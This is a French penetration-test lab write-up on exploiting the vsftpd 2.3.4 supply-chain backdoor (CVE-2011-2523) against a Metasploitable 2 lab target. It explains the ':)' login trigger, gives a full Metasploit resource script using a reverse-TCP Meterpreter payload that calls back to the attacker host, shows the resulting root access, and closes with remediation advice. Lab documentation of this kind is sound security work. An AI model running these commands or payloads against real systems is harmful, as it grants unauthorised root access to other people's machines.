vsftpd 2.3.4 — Backdoor

Exécution de commande à distance via porte dérobée insérée dans la chaîne de distribution

Service / PortFTP (vsftpd) — port 21
CibleMetasploitable 2 — 172.28.128.5
CVECVE-2011-2523
RésultatAccès root (session Meterpreter complète)
Testé parKAGBAHINTO Jules

1. Identification

Le scan de reconnaissance sur le port 21 de la cible révèle un serveur FTP vsftpd en version 2.3.4 — une version précise connue pour avoir été compromise au niveau de sa distribution officielle.

2. Méthode d'identification de la CVE et du module

À partir de la version exacte obtenue en reconnaissance (vsftpd 2.3.4), première question indépendante de tout outil : cette version a-t-elle une faille connue ?

$ searchsploit vsftpd 2.3.4

---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution      | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Me  | unix/remote/17491.rb
---------------------------------------------- ---------------------------------

Confirmé — un exploit existe. searchsploit ne donne ni la CVE ni un chemin de module Metasploit directement utilisable, donc étape suivante : chercher dans msfconsole puisque c'est l'outil choisi pour l'exploitation :

$ msfconsole -q -x "search vsftpd; exit"

#  Full Name                             Disclosure Date  Rank       Check  Name
-  ---------                             ---------------  ----       -----  ----
0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 and Earlier STAT Denial of Service
1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution

C'est de là que vient le chemin exact exploit/unix/ftp/vsftpd_234_backdoor — deux résultats remontent pour "vsftpd", mais un seul correspond à la version 2.3.4 précise identifiée en reconnaissance (vsftpd_232 vise une version antérieure et différente, un simple déni de service). Reste à obtenir la CVE elle-même, absente des deux résultats précédents :

$ msfconsole -q -x "info exploit/unix/ftp/vsftpd_234_backdoor; exit"

La section References de la sortie confirme CVE-2011-2523. En recoupant avec les liens fournis, on comprend la nature exacte de la faille : entre le 30 juin et le 3 juillet 2011, l'archive source officielle de vsftpd 2.3.4 a été remplacée par une version trafiquée directement sur le serveur de téléchargement du mainteneur — une compromission de la chaîne de distribution logicielle (supply chain), et non une faille de conception dans le code légitime du projet. Le code injecté active un mécanisme simple : si le nom d'utilisateur envoyé lors d'une connexion FTP contient la séquence :), le serveur ouvre un shell root en écoute sur le port TCP 6200, sans authentification supplémentaire.

Backdoor déclenchée par un simple login FTP contenant :) — aucune authentification valide requise. Shell root ouvert en écoute sur 6200/tcp.

3. Démarche d'exploitation

Le module Metasploit dédié existant déjà (exploit/unix/ftp/vsftpd_234_backdoor), aucune recherche d'exploit supplémentaire n'était nécessaire. L'exploitation a été scriptée via un resource script pour en garantir la reproductibilité :

cat > /tmp/vsftpd.rc << 'EOF'
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.28.128.5
set RPORT 21
set LHOST 172.28.128.1
exploit -z
sessions -l
sessions -i 1 -c id
sessions -K
exit -y
EOF
msfconsole -q -r /tmp/vsftpd.rc

Point d'attention — le réglage de LHOST est obligatoire : le payload par défaut de ce module (cmd/linux/http/x86/meterpreter_reverse_tcp) établit une connexion retour vers l'attaquant et a donc besoin de savoir où se connecter. Sans LHOST, l'exploitation échoue avec une erreur de validation d'option.

4. Preuve d'accès obtenu

La commande sessions -l confirme l'ouverture d'une session Meterpreter avec des privilèges root, et id exécuté dans la session confirme uid=0(root).

5. Remédiation

RECOMMANDATIONS
  • Mettre à jour vsftpd vers une version ultérieure non affectée par cette compromission historique (toute version postérieure à juillet 2011).
  • Vérifier systématiquement l'intégrité des archives source téléchargées (hash SHA-256 publié par le mainteneur) avant compilation/déploiement, en particulier pour les logiciels critiques exposés sur Internet.
  • Mettre en place une surveillance réseau capable de détecter l'ouverture inhabituelle d'un port en écoute (ici 6200/tcp) consécutive à une connexion sur un service exposé.
  • Appliquer le principe de moindre privilège : un service FTP ne devrait jamais pouvoir, même en cas de compromission, ouvrir un shell avec des droits root.
